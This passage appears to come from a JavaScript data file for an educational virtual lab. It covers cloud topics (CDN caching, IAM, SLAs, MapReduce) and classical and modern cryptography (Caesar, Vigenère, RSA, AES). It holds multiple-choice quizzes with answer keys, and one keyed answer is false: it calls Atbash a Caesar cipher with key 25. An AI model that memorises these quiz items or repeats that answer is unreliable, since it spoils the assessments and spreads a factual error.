        "aws cloudfront create-invalidation --distribution-id EXXX --paths '/*'",
        "curl -I https://cdn.example.com/image.jpg | grep -i cache"
    ],
    "practice_questions": [
        "Calculate the origin offload improvement when cache hit ratio increases from 60% to 90% for 1M daily requests.",
        "Design a CDN caching strategy for a news website with articles that update every 5 minutes."
    ]
};

window.VLAB_DATA.cloud_iam = {
    "title": "Identity & Access Management (IAM)",
    "aim": "To understand cloud IAM concepts including users, roles, policies, and the principle of least privilege, and simulate access control decisions using policy evaluation logic.",
    "theory": {
        "intro": "IAM (Identity and Access Management) is the security backbone of cloud platforms. It controls who (identity) can do what (actions) on which resources under what conditions. Properly configured IAM prevents unauthorized access, data breaches, and privilege escalation.",
        "cards": [
            {
                "title": "1. IAM Core Components",
                "content": "• Users: Individual human accounts (avoid long-term credentials; prefer roles)\n• Groups: Collections of users sharing the same policies\n• Roles: Temporary credentials assumed by services, EC2, Lambda, external identities\n• Policies: JSON documents defining Allow/Deny for actions on resources\n• Conditions: Restrict by IP, MFA, time, tag values\n\nGolden Rule: Use roles, not users, for service-to-service access."
            },
            {
                "title": "2. Policy Evaluation Logic",
                "content": "AWS evaluates policies in order:\n1. Explicit DENY wins always (overrides any Allow)\n2. Explicit ALLOW in identity policy\n3. Resource policy (S3 bucket policy, KMS key policy)\n4. Permission boundaries\n5. SCP (Service Control Policies from AWS Organizations)\n\nDefault: IMPLICIT DENY if no Allow matches."
            },
            {
                "title": "3. Principle of Least Privilege",
                "content": "Grant only the minimum permissions needed.\n• Start with managed policies then refine\n• Use IAM Access Analyzer to identify unused permissions\n• Enable AWS CloudTrail to audit all API calls\n• Rotate access keys regularly\n• Enforce MFA for console access\n• Use SCPs to enforce guardrails across all accounts"
            },
            {
                "title": "4. RBAC vs ABAC",
                "content": "RBAC (Role-Based Access Control):\n• Permissions tied to job roles (Admin, ReadOnly, Developer)\n• Simple, predictable, easy to manage at scale\n\nABAC (Attribute-Based Access Control):\n• Permissions based on tags/attributes (Environment=prod, Team=finance)\n• More flexible, scales without creating many policies\n• AWS supports ABAC via condition keys (aws:ResourceTag, aws:PrincipalTag)"
            }
        ]
    },
    "pretest": [
        {
            "q": "In AWS IAM, an explicit Deny:",
            "options": [
                "Can be overridden by an explicit Allow",
                "Always overrides any Allow",
                "Only applies to root users",
                "Applies only to S3 buckets"
            ],
            "correct": 1
        },
        {
            "q": "A service role in IAM is used by:",
            "options": [
                "Human users only",
                "AWS services like EC2, Lambda to access other AWS resources",
                "External IdPs only",
                "Only root accounts"
            ],
            "correct": 1
        },
        {
            "q": "Principle of least privilege means:",
            "options": [
                "Grant all permissions then remove unused ones",
                "Grant only the minimum permissions required for the task",
                "Use root credentials for all operations",
                "Share credentials among team members"
            ],
            "correct": 1
        },
        {
            "q": "AWS CloudTrail provides:",
            "options": [
                "Real-time performance monitoring",
                "Audit log of all API calls made in your AWS account",
                "Network traffic analysis",
                "Cost optimization recommendations"
            ],
            "correct": 1
        },
        {
            "q": "An IAM Permission Boundary:",
            "options": [
                "Grants permissions directly",
                "Sets the maximum permissions an IAM entity can have",
                "Replaces SCP policies",
                "Encrypts IAM credentials"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Create an IAM user and assign them to a 'Developers' group with a managed policy.",
        "2. Create a custom policy — allow S3:GetObject on a specific bucket.",
        "3. Attach the policy and test access: observe Allow for the bucket, Deny for others.",
        "4. Add an explicit Deny policy and verify it overrides the Allow.",
        "5. Create an IAM role for EC2 and test service-to-service access without static credentials."
    ],
    "posttest": [
        {
            "q": "IAM Access Analyzer helps by:",
            "options": [
                "Encrypting IAM policies",
                "Identifying resources shared with external principals or unused permissions",
                "Managing MFA tokens",
                "Generating IAM users automatically"
            ],
            "correct": 1
        },
        {
            "q": "Service Control Policies (SCPs) in AWS Organizations:",
            "options": [
                "Grant permissions to IAM roles",
                "Set permission guardrails for all accounts in an organizational unit",
                "Replace IAM policies",
                "Configure VPC security groups"
            ],
            "correct": 1
        },
        {
            "q": "AssumeRole with Web Identity is used for:",
            "options": [
                "EC2 instance profiles",
                "Federated identity (Google, GitHub, OIDC) assuming an IAM role",
                "Cross-account S3 access only",
                "Lambda function execution"
            ],
            "correct": 1
        },
        {
            "q": "An IAM policy's Resource element:",
            "options": [
                "Specifies the IAM user applying the policy",
                "Specifies the AWS resources the policy applies to (ARNs)",
                "Defines the policy version",
                "Lists allowed regions"
            ],
            "correct": 1
        },
        {
            "q": "aws:MultiFactorAuthPresent condition key:",
            "options": [
                "Enables MFA for root account",
                "Requires MFA authentication for the request to be allowed",
                "Lists MFA devices",
                "Disables password login"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_iam",
    "practice_commands": [
        "aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123:user/dev --action-names s3:GetObject --resource-arns arn:aws:s3:::my-bucket/*",
        "aws iam get-account-authorization-details"
    ],
    "practice_questions": [
        "Write an IAM policy granting a Lambda function read-only access to a DynamoDB table with a specific tag.",
        "Identify the security risks in an IAM policy that uses 'Resource: *' with 'Action: *."
    ]
};

window.VLAB_DATA.cloud_sla = {
    "title": "SLA Monitoring & Fault Tolerance",
    "aim": "To understand cloud SLA metrics, calculate availability percentages, and design fault-tolerant architectures with redundancy to meet SLA targets.",
    "theory": {
        "intro": "A Service Level Agreement (SLA) is a contract between a cloud provider and customer defining the expected level of service, primarily measured as availability (uptime percentage). Fault tolerance is the ability of a system to continue operating correctly even when components fail.",
        "cards": [
            {
                "title": "1. Availability & The Nines",
                "content": "Availability = (Total Time - Downtime) / Total Time × 100%\n\n• 99% ('two nines') → 87.6 hr/year downtime\n• 99.9% ('three nines') → 8.77 hr/year downtime\n• 99.99% ('four nines') → 52.6 min/year downtime\n• 99.999% ('five nines') → 5.26 min/year downtime\n\nFor N components in series: A_total = A1 × A2 × ... × An"
            },
            {
                "title": "2. Redundancy Patterns",
                "content": "Active-Active: Multiple instances serve traffic simultaneously\n• Higher throughput, automatic failover\n\nActive-Passive: One active, one standby (hot/warm/cold)\n• Hot standby: Fully running, instant failover\n• Warm standby: Partially running, fast startup\n• Cold standby: Powered off, slowest failover\n\nN+1 Redundancy: N minimum required + 1 spare"
            },
            {
                "title": "3. Key SLA Metrics",
                "content": "• MTBF (Mean Time Between Failures): Average time between system failures\n• MTTR (Mean Time to Repair): Average time to restore service\n• Availability = MTBF / (MTBF + MTTR)\n• RTO (Recovery Time Objective): Max acceptable downtime after failure\n• RPO (Recovery Point Objective): Max acceptable data loss (time)\n• SLO (Service Level Objective): Internal target (stricter than SLA)\n• SLI (Service Level Indicator): Actual measured metric"
            },
            {
                "title": "4. AWS Fault Tolerance Tools",
                "content": "• Multi-AZ deployments: RDS, ElastiCache auto-failover across AZs\n• Multi-Region: Route 53 health checks + failover routing\n• Auto Scaling: Replace failed instances automatically\n• ELB Health Checks: Remove unhealthy targets from rotation\n• S3 Cross-Region Replication: Data redundancy across regions\n• Circuit Breaker pattern: Stop cascading failures in microservices"
            }
        ]
    },
    "pretest": [
        {
            "q": "99.9% availability allows how much downtime per year?",
            "options": [
                "52.6 minutes",
                "8.77 hours",
                "87.6 hours",
                "1 hour"
            ],
            "correct": 1
        },
        {
            "q": "RTO (Recovery Time Objective) defines:",
            "options": [
                "How much data can be lost",
                "Maximum acceptable time to restore service after failure",
                "Server reboot time",
                "Database backup interval"
            ],
            "correct": 1
        },
        {
            "q": "For two components in series with 99.9% availability each, total availability is:",
            "options": [
                "99.9%",
                "~99.8% (0.999 × 0.999)",
                "100%",
                "99.5%"
            ],
            "correct": 1
        },
        {
            "q": "Active-Active redundancy differs from Active-Passive in that:",
            "options": [
                "It uses more instances",
                "Both instances serve traffic simultaneously",
                "It requires manual failover",
                "It is cheaper"
            ],
            "correct": 1
        },
        {
            "q": "MTBF measures:",
            "options": [
                "Maximum time before failure",
                "Average time between system failures",
                "Minimum backup frequency",
                "Maximum transfer bandwidth"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the system architecture with components and their individual availability ratings.",
        "2. Calculate the end-to-end availability for components in series.",
        "3. Add redundant components in parallel and observe availability improvement.",
        "4. Simulate a component failure — watch the failover mechanism activate.",
        "5. Adjust MTBF and MTTR values and observe the impact on SLA compliance."
    ],
    "posttest": [
        {
            "q": "An RPO of 1 hour means:",
            "options": [
                "Service must recover within 1 hour",
                "At most 1 hour of data can be lost in a failure",
                "Backups run every hour",
                "Recovery takes exactly 1 hour"
            ],
            "correct": 1
        },
        {
            "q": "AWS Multi-AZ for RDS provides:",
            "options": [
                "Read scaling across regions",
                "Synchronous replication with automatic failover within a region",
                "Cost reduction",
                "Horizontal write scaling"
            ],
            "correct": 1
        },
        {
            "q": "Chaos Engineering (Netflix Chaos Monkey) tests:",
            "options": [
                "Database performance under load",
                "System resilience by intentionally injecting failures in production",
                "Cost optimization strategies",
                "Network bandwidth limits"
            ],
            "correct": 1
        },
        {
            "q": "An SLO is typically:",
            "options": [
                "Less strict than the SLA",
                "Stricter than the SLA, used internally to catch issues before SLA breach",
                "Equal to SLI measurements",
                "Defined by the customer"
            ],
            "correct": 1
        },
        {
            "q": "Error Budget in SRE is:",
            "options": [
                "Financial budget for fixing bugs",
                "1 - SLO target (allowed failure budget before SLA is breached)",
                "Number of errors per request",
                "AWS support plan cost"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_sla",
    "practice_commands": [
        "aws cloudwatch get-metric-statistics --namespace AWS/EC2 --metric-name CPUUtilization",
        "aws route53 create-health-check --caller-reference unique-id --health-check-config file://hc.json"
    ],
    "practice_questions": [
        "Calculate the SLA of a system with Web Tier (99.99%), App Tier (99.9%), and DB Tier (99.9%) in series.",
        "Design an architecture achieving 99.999% availability for a payment processing service."
    ]
};

window.VLAB_DATA.cloud_mapreduce = {
    "title": "MapReduce & Parallel Processing",
    "aim": "To understand the MapReduce distributed computing paradigm, implement word count examples, and observe parallel data processing across simulated worker nodes.",
    "theory": {
        "intro": "MapReduce is a programming model for processing large datasets in parallel across a distributed cluster. Introduced by Google (2004), it abstracts the complexity of distributed computing into two functions: Map (transform and filter data into key-value pairs) and Reduce (aggregate key-value pairs into results).",
        "cards": [
            {
                "title": "1. MapReduce Phases",
                "content": "1. INPUT SPLIT: Large dataset divided into fixed-size chunks (128MB in HDFS)\n2. MAP phase: Each mapper processes one split independently\n   Input: (key, value) → Output: list of (intermediate_key, value)\n3. SHUFFLE & SORT: Framework groups all values by key\n4. REDUCE phase: Each reducer aggregates values for its assigned keys\n   Input: (key, [v1,v2,...]) → Output: (key, aggregated_value)\n5. OUTPUT: Results written to distributed filesystem"
            },
            {
                "title": "2. Word Count Example",
                "content": "Classic MapReduce:\n\nMAP: Input: (doc_id, 'the quick brown fox')\n  Output: [('the',1),('quick',1),('brown',1),('fox',1)]\n\nSHUFFLE: Group by word → ('the',[1,1]), ('fox',[1])\n\nREDUCE: ('the', [1,1]) → ('the', 2)\n         ('fox', [1]) → ('fox', 1)"
            },
            {
                "title": "3. Hadoop Ecosystem",
                "content": "• HDFS: Distributed storage with 3x replication\n• YARN: Resource manager — allocates CPU/RAM to MapReduce jobs\n• NameNode: Manages file system metadata\n• DataNodes: Store actual data blocks\n• MapReduce v2: Runs on YARN\n• Alternatives: Apache Spark (in-memory, 100x faster), Apache Flink (streaming)\n• Cloud managed: AWS EMR, Google Dataproc, Azure HDInsight"
            },
            {
                "title": "4. Optimization Techniques",
                "content": "• Combiners: Mini-reducer on mapper output to reduce shuffle data\n  Example: (the,1),(the,1) → Combiner → (the,2) before shuffle\n• Partitioner: Controls which reducer gets which keys\n• Compression: Compress mapper output and HDFS data\n• Speculative Execution: Rerun slow tasks on other nodes\n• Data Locality: Schedule map tasks on nodes holding the data"
            }
        ]
    },
    "pretest": [
        {
            "q": "In MapReduce, the Shuffle phase:",
            "options": [
                "Sorts the final output",
                "Groups and transfers intermediate key-value pairs to reducers",
                "Splits input data into chunks",
                "Runs user-defined reduce logic"
            ],
            "correct": 1
        },
        {
            "q": "HDFS default block size and replication factor are:",
            "options": [
                "64MB, 2x",
                "128MB, 3x",
                "256MB, 1x",
                "512MB, 5x"
            ],
            "correct": 1
        },
        {
            "q": "A MapReduce Combiner is used to:",
            "options": [
                "Combine multiple MapReduce jobs",
                "Reduce shuffle data by pre-aggregating mapper output locally",
                "Replace the Reducer function",
                "Partition keys evenly"
            ],
            "correct": 1
        },
        {
            "q": "Data locality in Hadoop means:",
            "options": [
                "All data stored in one location",
                "Map tasks scheduled on nodes that already hold the data",
                "Data compressed locally",
                "Reducers run on same node as mappers"
            ],
            "correct": 1
        },
        {
            "q": "Apache Spark improves on Hadoop MapReduce by:",
            "options": [
                "Using more network bandwidth",
                "Processing data in-memory instead of writing intermediate results to disk",
                "Running only on cloud platforms",
                "Using single node architecture"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Load a sample text corpus distributed across 4 HDFS blocks.",
        "2. Run the Map phase — observe each mapper emitting (word,1) pairs.",
        "3. Watch the Shuffle & Sort phase group all identical words together.",
        "4. Run the Reduce phase — observe each reducer summing word counts.",
        "5. Enable a Combiner and compare shuffle data size vs without combiner."
    ],
    "posttest": [
        {
            "q": "An Inverted Index MapReduce job maps:",
            "options": [
                "Words to document IDs where they appear",
                "Document IDs to word counts",
                "Files to their sizes",
                "URLs to page ranks"
            ],
            "correct": 0
        },
        {
            "q": "YARN in Hadoop is responsible for:",
            "options": [
                "File system metadata management",
                "Cluster resource management and job scheduling",
                "Network routing between nodes",
                "Data encryption in HDFS"
            ],
            "correct": 1
        },
        {
            "q": "Speculative execution in MapReduce handles:",
            "options": [
                "Security vulnerabilities",
                "Straggler tasks by running duplicate tasks on other nodes",
                "Data skew by repartitioning",
                "Failed reduce tasks"
            ],
            "correct": 1
        },
        {
            "q": "The NameNode in HDFS stores:",
            "options": [
                "Actual data blocks",
                "File system namespace and metadata (file to block mapping)",
                "MapReduce job history",
                "YARN resource information"
            ],
            "correct": 1
        },
        {
            "q": "Google's MapReduce solved the problem of:",
            "options": [
                "Web browser rendering",
                "Processing petabytes of web crawl data across thousands of commodity machines",
                "Database query optimization",
                "Network packet routing"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_mapreduce",
    "practice_commands": [
        "hadoop jar hadoop-mapreduce-examples.jar wordcount /input /output",
        "hdfs dfs -ls /user/hadoop/",
        "yarn application -list -appStates RUNNING"
    ],
    "practice_questions": [
        "Write pseudo-code for a MapReduce job that computes the average rating per product from (user_id, product_id, rating) records.",
        "Explain why Spark outperforms MapReduce for iterative machine learning algorithms."
    ]
};

window.VLAB_DATA.cyber_caesar = {
    "title": "Caesar Cipher & ROT13",
    "aim": "To understand the Caesar substitution cipher, perform manual encryption and decryption, perform frequency analysis to break the cipher, and implement ROT13 as a special case.",
    "theory": {
        "intro": "The Caesar cipher is one of the oldest encryption techniques, named after Julius Caesar. It is a monoalphabetic substitution cipher where each letter in the plaintext is shifted a fixed number of positions down the alphabet. While trivially broken today, it introduces core cryptography concepts: plaintext, ciphertext, key, and substitution.",
        "cards": [
            {
                "title": "1. How Caesar Cipher Works",
                "content": "Each letter is replaced by the letter n positions ahead in the alphabet.\nEncrypt: C = (P + key) mod 26\nDecrypt: P = (C - key + 26) mod 26\n\nExample (key=3):\n  Plaintext:  HELLO WORLD\n  Ciphertext: KHOOR ZRUOG\n\nROT13 is Caesar with key=13. It is its own inverse:\n  ROT13(ROT13(x)) = x\n  Used on early internet forums to hide spoilers."
            },
            {
                "title": "2. Frequency Analysis Attack",
                "content": "In English, letter frequencies are non-uniform:\n  E: 12.7%, T: 9.1%, A: 8.2%, O: 7.5%, I: 7.0%\n\nAttack: Count letter frequencies in ciphertext.\n  Most frequent ciphertext letter → likely 'E' in plaintext.\n  Shift = (ciphertext_freq_letter - 'E') mod 26\n\nWith sufficient ciphertext, this breaks any shift cipher."
            },
            {
                "title": "3. Brute Force Attack",
                "content": "Only 25 possible keys (shift 1..25). Exhaustive search:\n  Try all 25 shifts.\n  Apply English word frequency scoring (Index of Coincidence).\n  Select the shift producing most English-like output.\n\nComputer can break Caesar in microseconds.\nAES-128 has 2^128 keys — brute force completely infeasible."
            },
            {
                "title": "4. From Caesar to Modern Ciphers",
                "content": "Caesar → Vigenère → One-Time Pad → AES (evolution of symmetric ciphers)\n• Caesar: Fixed shift, trivially broken\n• Vigenère: Polyalphabetic (different shifts per position)\n• Enigma: Mechanical polyalphabetic, broken by Turing at Bletchley Park\n• AES: Block cipher with complex key scheduling and S-boxes"
            }
        ]
    },
    "pretest": [
        {
            "q": "Caesar cipher with key=3 encrypts 'A' as:",
            "options": [
                "A",
                "D",
                "C",
                "Z"
            ],
            "correct": 1
        },
        {
            "q": "ROT13 applied twice to any text produces:",
            "options": [
                "Encrypted text",
                "The original text",
                "Random output",
                "All uppercase"
            ],
            "correct": 1
        },
        {
            "q": "Frequency analysis exploits the fact that:",
            "options": [
                "Caesar key is always 13",
                "Monoalphabetic substitution preserves letter frequency distribution",
                "All letters appear equally often",
                "The alphabet has 26 letters"
            ],
            "correct": 1
        },
        {
            "q": "The number of possible keys in Caesar cipher is:",
            "options": [
                "26",
                "25",
                "256",
                "Infinite"
            ],
            "correct": 1
        },
        {
            "q": "Caesar cipher is classified as:",
            "options": [
                "Asymmetric cipher",
                "Monoalphabetic substitution cipher",
                "Transposition cipher",
                "Hash function"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Enter a plaintext message and choose a shift key (1-25).",
        "2. Click Encrypt — observe each letter being shifted in the alphabet visualization.",
        "3. Decrypt the ciphertext using the same key — verify you get the original.",
        "4. Switch to Attack Mode: intercept an unknown ciphertext.",
        "5. Use frequency analysis to identify the likely key and decrypt."
    ],
    "posttest": [
        {
            "q": "Decryption formula for Caesar cipher with key k is:",
            "options": [
                "P = C + k mod 26",
                "P = (C - k + 26) mod 26",
                "P = C x k mod 26",
                "P = C XOR k"
            ],
            "correct": 1
        },
        {
            "q": "The Index of Coincidence (IC) for English text is approximately:",
            "options": [
                "0.038",
                "0.065",
                "0.5",
                "1.0"
            ],
            "correct": 1
        },
        {
            "q": "A Kasiski examination attack is used to break:",
            "options": [
                "Caesar cipher",
                "Vigenère cipher",
                "AES",
                "RSA"
            ],
            "correct": 1
        },
        {
            "q": "Why is Caesar cipher considered insecure?",
            "options": [
                "Key too long to remember",
                "Only 25 possible keys and frequency analysis trivially identifies the key",
                "It requires too much computation",
                "It only works on uppercase letters"
            ],
            "correct": 1
        },
        {
            "q": "Atbash cipher maps 'A' to 'Z', 'B' to 'Y'. It is a Caesar cipher with key:",
            "options": [
                "1",
                "13",
                "25",
                "0"
            ],
            "correct": 2
        }
    ],
    "simType": "cyber_caesar",
    "practice_commands": [
        "echo 'HELLO' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
        "python3 -c \"s='KHOOR'; print(''.join(chr((ord(c)-ord('A')-3)%26+ord('A')) for c in s))\""
    ],
    "practice_questions": [
        "Implement a Caesar cipher brute-force breaker using letter frequency analysis in Python.",
        "Decrypt: 'WKH TXLFN EURZQ IRA' using frequency analysis or brute force."
    ]
};

window.VLAB_DATA.cyber_vigenere = {
    "title": "Vigenère Cipher",
    "aim": "To understand the Vigenère polyalphabetic substitution cipher, perform encryption and decryption using a keyword, and use the Kasiski examination to determine key length and break the cipher.",
    "theory": {
        "intro": "The Vigenère cipher uses a keyword to apply different Caesar shifts to each letter, defeating simple frequency analysis. However, once the key length is known via Kasiski examination, it reduces to multiple Caesar ciphers — each breakable individually.",
        "cards": [
            {
                "title": "1. Vigenère Encryption",
                "content": "Key repeated to match plaintext length:\n  Plaintext:  ATTACKATDAWN\n  Key:        LEMONLEMONLE\n  Ciphertext: LXFOPVEFRNHR\n\nFor each position i:\n  Cipher[i] = (Plain[i] + Key[i mod keylen]) mod 26\n  Decrypt[i] = (Cipher[i] - Key[i mod keylen] + 26) mod 26"
            },
            {
                "title": "2. Kasiski Examination",
                "content": "Kasiski (1863):\n1. Find repeated patterns (3+ chars) in ciphertext\n2. Measure distances between repetitions\n3. Key length = GCD of all distances\n4. Once key length L is known:\n   Split ciphertext into L groups\n   Each group is a Caesar cipher breakable by frequency analysis\n5. Recover full key letter by letter"
            },
            {
                "title": "3. Index of Coincidence",
                "content": "IC = Sum(ni*(ni-1)) / (N*(N-1))\n\n• Random text IC = 0.038\n• English text IC = 0.065\n\nEstimate key length: L ~ (0.027*N) / ((N-1)*IC - 0.038*N + 0.065)\n\nTest key lengths L: compute IC of each of L groups — target IC ~ 0.065"
            },
            {
                "title": "4. One-Time Pad",
                "content": "If key is as long as plaintext, truly random, used only once:\n→ Vigenère becomes a One-Time Pad (OTP) — provably unbreakable!\n\nShannon (1949): OTP has perfect secrecy.\n\nPractical limitation: Key distribution problem.\nSolution: Asymmetric cryptography (RSA, ECDH) for key exchange."
            }
        ]
    },
    "pretest": [
        {
            "q": "Vigenère cipher improves over Caesar by:",
            "options": [
                "Using longer keys",
                "Using different shift for each letter position based on a keyword",
                "Using numbers instead of letters",
                "Applying two rounds of Caesar"
            ],
            "correct": 1
        },
        {
            "q": "Kasiski examination determines:",
            "options": [
                "The plaintext directly",
                "The length of the Vigenère key",
                "Whether the cipher is monoalphabetic",
                "The frequency of each letter"
            ],
            "correct": 1
        },
        {
            "q": "A One-Time Pad is theoretically unbreakable because:",
            "options": [
                "The key is very long",
                "The key is random, as long as the message, and used only once",
                "It uses asymmetric encryption",
                "It applies multiple rounds of substitution"
            ],
            "correct": 1
        },
        {
            "q": "After finding key length L in Vigenère, each group of characters:",
            "options": [
                "Requires brute force of 2^256 keys",
                "Is a simple Caesar cipher breakable by frequency analysis",
                "Is encrypted with RSA",
                "Cannot be decrypted without the key"
            ],
            "correct": 1
        },
        {
            "q": "The Index of Coincidence for English text is approximately:",
            "options": [
                "0.038",
                "0.065",
                "0.5",
                "0.001"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Enter plaintext and a keyword — observe how the keyword repeats over the plaintext.",
        "2. Encrypt and see each letter shifted by the corresponding key letter.",
        "3. View the Vigenère square highlighting each encryption step.",
        "4. In Cryptanalysis Mode, receive an unknown Vigenère ciphertext.",
        "5. Apply Kasiski examination: find repeated patterns, compute GCD, recover key, decrypt."
    ],
    "posttest": [
        {
            "q": "The Vigenère tableau (tabula recta) contains:",
            "options": [
                "26 rows of random letters",
                "26 rows of Caesar-shifted alphabets (row i = shift by i)",
                "ASCII character codes",
                "Frequency tables for English"
            ],
            "correct": 1
        },
        {
            "q": "Beaufort cipher differs from Vigenère in that:",
            "options": [
                "It uses asymmetric keys",
                "Encryption and decryption use the same operation (cipher[i] = key[i] - plain[i])",
                "It requires a longer key",
                "It produces binary output"
            ],
            "correct": 1
        },
        {
            "q": "Running Key cipher uses what as the key?",
            "options": [
                "A short repeated keyword",
                "A long text (e.g., a book passage) as the key",
                "A random number",
                "The plaintext itself"
            ],
            "correct": 1
        },
        {
            "q": "Why didn't Vigenère resist Kasiski's attack?",
            "options": [
                "The key was too short",
                "Repeating the key creates patterns in the ciphertext that reveal key length",
                "Frequency analysis directly applies",
                "The alphabet is too small"
            ],
            "correct": 1
        },
        {
            "q": "Autokey cipher improvement over Vigenère:",
            "options": [
                "Uses a different alphabet",
                "Uses the plaintext itself as key extension after the initial keyword",
                "Applies XOR instead of addition",
                "Uses prime number keys"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_vigenere",
    "practice_commands": [
        "python3 -c \"key='LEMON'; pt='ATTACKATDAWN'; print(''.join(chr((ord(p)+ord(key[i%len(key)])-2*ord('A'))%26+ord('A')) for i,p in enumerate(pt)))\""
    ],
    "practice_questions": [
        "Given ciphertext 'LXFOPVEFRNHR' and key 'LEMON', decrypt it showing each step.",
        "Find the key length of 'QPWKALVRXCQZIKPVIKEFMD' using the Kasiski test or Index of Coincidence."
    ]
};

window.VLAB_DATA.cyber_rsa = {
    "title": "RSA Public-Key Encryption",
    "aim": "To understand the RSA asymmetric encryption algorithm, perform key generation, encryption, and decryption with small prime numbers, and understand the mathematical basis of RSA security.",
    "theory": {
        "intro": "RSA (Rivest-Shamir-Adleman, 1977) is the foundational public-key cryptosystem. The security of RSA relies on the computational difficulty of factoring the product of two large prime numbers.",
        "cards": [
            {
                "title": "1. RSA Key Generation",
                "content": "1. Choose two large primes: p and q (e.g., p=61, q=53)\n2. Compute n = p * q = 3233 (modulus, public)\n3. Compute phi(n) = (p-1)(q-1) = 3120\n4. Choose e: 1 < e < phi(n), gcd(e, phi(n)) = 1 (e=17)\n5. Compute d: d*e = 1 (mod phi(n)) → d=2753\n\nPublic Key: (e=17, n=3233)\nPrivate Key: (d=2753, n=3233)"
            },
            {
                "title": "2. RSA Encrypt & Decrypt",
                "content": "Encrypt: C = M^e mod n\nDecrypt: M = C^d mod n\n\nExample (e=17, d=2753, n=3233, M=65):\n  Encrypt: C = 65^17 mod 3233 = 2790\n  Decrypt: M = 2790^2753 mod 3233 = 65\n\nRSA Sign: S = M^d mod n (sign with PRIVATE key)\nRSA Verify: M = S^e mod n (verify with PUBLIC key)"
            },
            {
                "title": "3. Security & Key Sizes",
                "content": "Security = Difficulty of factoring n = p * q\n• 512-bit RSA: Broken in 1999\n• 1024-bit RSA: Not recommended\n• 2048-bit RSA: Current minimum recommendation\n• 4096-bit RSA: High security\n\nCommon attacks:\n• Factoring attack: Factor n to find d\n• Small exponent attack: If e=3 and M^3 < n, no modular reduction\n• Timing attack: Measure decryption time to infer d"
            },
            {
                "title": "4. RSA in Practice",
                "content": "RSA is used for:\n• Key exchange: RSA encrypts a symmetric session key\n• Digital signatures: Code signing, TLS certificates\n• TLS/SSL handshake: Server certificate authentication\n\nHybrid encryption:\n  1. Generate random AES-256 key\n  2. Encrypt AES key with recipient's RSA public key\n  3. Encrypt message with AES (fast)\n  4. Send encrypted AES key + AES-encrypted data"
            }
        ]
    },
    "pretest": [
        {
            "q": "RSA public key consists of:",
            "options": [
                "Private exponent d and modulus n",
                "Public exponent e and modulus n",
                "Primes p and q",
                "Hash of the private key"
            ],
            "correct": 1
        },
        {
            "q": "RSA security relies on the difficulty of:",
            "options": [
                "Computing square roots",
                "Factoring the product of two large primes",
                "Solving discrete logarithms",
                "Inverting SHA-256"
            ],
            "correct": 1
        },
        {
            "q": "In RSA, phi(n) where n = p * q equals:",
            "options": [
                "p + q",
                "(p-1)(q-1)",
                "p * q - 1",
                "p * q + 1"
            ],
            "correct": 1
        },
        {
            "q": "RSA decryption uses:",
            "options": [
                "Public key (e, n)",
                "Private key (d, n)",
                "The hash of the ciphertext",
                "The prime factors p and q directly"
            ],
            "correct": 1
        },
        {
            "q": "Why is RSA not used to encrypt large files directly?",
            "options": [
                "RSA can only encrypt 26 letters",
                "RSA is computationally slow for bulk data",
                "RSA requires quantum computers",
                "RSA only works for integers under 100"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Start with small primes p and q — observe n, phi(n), and valid e values.",
        "2. Compute the private key d using the extended Euclidean algorithm.",
        "3. Encrypt a short message M: compute C = M^e mod n.",
        "4. Decrypt: compute M = C^d mod n — verify you recover original M.",
        "5. Try RSA signing: sign with private key, verify with public key."
    ],
    "posttest": [
        {
            "q": "The extended Euclidean algorithm in RSA is used to compute:",
            "options": [
                "n = p * q",
                "The modular inverse of e (mod phi(n)) to find d",
                "Prime factors of n",
                "The public exponent e"
            ],
            "correct": 1
        },
        {
            "q": "RSA-OAEP is preferred over RSA-PKCS1v1.5 because:",
            "options": [
                "It is faster",
                "It adds randomized padding preventing padding oracle attacks",
                "It uses smaller keys",
                "It works with elliptic curves"
            ],
            "correct": 1
        },
        {
            "q": "A quantum computer running Shor's algorithm could:",
            "options": [
                "Break AES-256",
                "Factor RSA moduli in polynomial time, breaking RSA",
                "Improve RSA key generation",
                "Only affect hash functions"
            ],
            "correct": 1
        },
        {
            "q": "Perfect Forward Secrecy (PFS) in TLS is achieved by:",
            "options": [
                "Using RSA for all key exchange",
                "Using ephemeral Diffie-Hellman (ECDHE) so session keys are not derived from long-term RSA keys",
                "Rotating RSA certificates daily",
                "Encrypting RSA private keys"
            ],
            "correct": 1
        },
        {
            "q": "RSA key generation requires p and q to be:",
            "options": [
                "Equal primes",
                "Large, distinct, randomly chosen prime numbers",
                "Consecutive primes",
                "Primes less than 1000"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_rsa",
    "practice_commands": [
        "openssl genrsa -out private.pem 2048",
        "openssl rsa -in private.pem -pubout -out public.pem",
        "openssl rsautl -encrypt -inkey public.pem -pubin -in msg.txt -out msg.enc"
    ],
    "practice_questions": [
        "Given p=11, q=13: compute n, phi(n), choose e, compute d, then encrypt M=7.",
        "Explain why RSA with small public exponent e=3 is vulnerable when M^e < n."
    ]
};

window.VLAB_DATA.cyber_aes = {
    "title": "AES Block Cipher",
    "aim": "To understand the AES symmetric block cipher structure, key expansion, and the SubBytes, ShiftRows, MixColumns, and AddRoundKey transformations.",
    "theory": {
        "intro": "AES (Advanced Encryption Standard, NIST 2001) is a symmetric block cipher operating on 128-bit blocks with 128, 192, or 256-bit keys. AES is used everywhere: TLS/HTTPS, disk encryption (BitLocker, FileVault), Wi-Fi (WPA2/WPA3). No practical attack beyond brute force is known.",
        "cards": [
            {
                "title": "1. AES Structure",
                "content": "Block size: 128 bits (16 bytes) in a 4x4 State matrix\nKey sizes: AES-128 (10 rounds), AES-192 (12), AES-256 (14)\n\nEach round applies 4 transformations:\n1. SubBytes: Non-linear S-Box substitution (confusion)\n2. ShiftRows: Cyclic left shift of each row (diffusion)\n3. MixColumns: Matrix multiplication in GF(2^8) (diffusion)\n4. AddRoundKey: XOR with round key\n\nFinal round: SubBytes + ShiftRows + AddRoundKey only"
            },
            {
                "title": "2. Key Schedule",
